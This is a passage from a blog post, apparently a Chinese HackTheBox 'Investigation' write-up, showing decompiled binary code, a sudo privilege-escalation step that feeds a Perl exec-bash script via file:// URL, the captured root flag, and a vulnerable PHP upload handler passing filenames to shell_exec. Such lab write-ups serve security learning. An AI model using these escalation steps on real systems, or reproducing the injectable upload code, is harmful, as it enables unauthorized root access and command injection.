fclose(stream);</span><br><span class="line">  curl_easy_cleanup(v5);</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  system(command);</span><br><span class="line">  system(<span class="string">&quot;rm -f ./lDnxUysaQn&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>10002LL: This sets the URL to use for the request, and the value is passed in as the argv[1] parameter.</li>
+<li>10001LL: This sets the output stream to use for the response, and the value is passed in as the stream parameter.</li>
+<li>45LL: This sets the CURLOPT_VERBOSE option to 1, which causes libcurl to output verbose information about the request and response to the console.</li>
+</ul>
+<blockquote>
+<p>Generated by ChatGPT</p>
+</blockquote>
+<p>大概意思是<code>curl argv[1] -o argv[2] -v</code></p>
+<p>构造perl提权脚本并触发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span> &gt; /tmp/bfl</span><br><span class="line">sudo -u root /usr/bin/binary file:///tmp/bfl lDnxUysaQn</span><br></pre></td></tr></table></figure>
+<p>get root, 查看root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4a5dc64d395878aa52ec1bc85c579d67</span><br></pre></td></tr></table></figure>
+<hr />
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]==<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">		<span class="variable">$image_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="variable">$original_name</span> = <span class="variable">$image_name</span>;</span><br><span class="line">		<span class="variable">$sanitised</span> = preg_replace(<span class="string">&#x27;/[^a-zA-Z0-9]+/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$original_name</span>);</span><br><span class="line">		<span class="variable">$image_type</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$image_name</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$image_name</span>);</span><br><span class="line">		<span class="variable">$folder</span>=time();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(in_array(<span class="variable">$image_type</span>[<span class="string">&#x27;mime&#x27;</span>], <span class="variable">$allow_type</span>))&#123;</span><br><span class="line">			<span class="keyword">list</span>(<span class="variable">$width</span>, <span class="variable">$height</span>, <span class="variable">$mime</span>) = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$width</span>&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$height</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">				mkdir(<span class="string">&quot;/var/www/uploads/<span class="subst">$folder</span>&quot;</span>);</span><br><span class="line">				<span class="variable">$upload</span> = move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;/var/www/uploads/&#x27;</span>.<span class="variable">$folder</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (<span class="variable">$upload</span>) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="variable">$sanitised</span>.<span class="string">&#x27; has been uploaded. The analysis report can be viewed &lt;a href=analysed_images/&#x27;</span>.<span class="variable">$sanitised</span>.<span class="string">&#x27;.txt&gt;here&lt;/a&gt; &lt;/p&gt;&#x27;</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Please save this report as it will only be available for the next five minutes&lt;/p&gt;&#x27;</span>;</span><br><span class="line">					<span class="variable">$folder</span> = <span class="string">&quot;/var/www/uploads/<span class="subst">$folder</span>&quot;</span>;</span><br><span class="line">					<span class="variable">$cmd</span> = <span class="string">&quot;cd <span class="subst">$folder</span> &amp;&amp; /opt/exiftool/exiftool * &gt; /var/www/html/analysed_images/<span class="subst">$sanitised</span>.txt&quot;</span>;</span><br><span class="line">					shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;Error: Only JPEG and PNG are allowed&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Error: Only JPEG and PNG are allow&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Error: Invalid File Type!&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>意思是没必要用<code>`</code></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2023/03/21/HackTheBox-Investigation/" title="HackTheBox_Investigation">https://yoloyolo.top/2023/03/21/HackTheBox-Investigation/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/21/HackTheBox-Inject/" rel="prev" title="HackTheBox_Inject">
+      <i class="fa fa-chevron-left"></i> HackTheBox_Inject
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_investigation"><span class="nav-number">1.</span> <span class="nav-text"> HackTheBox_Investigation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text"> 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 路径枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
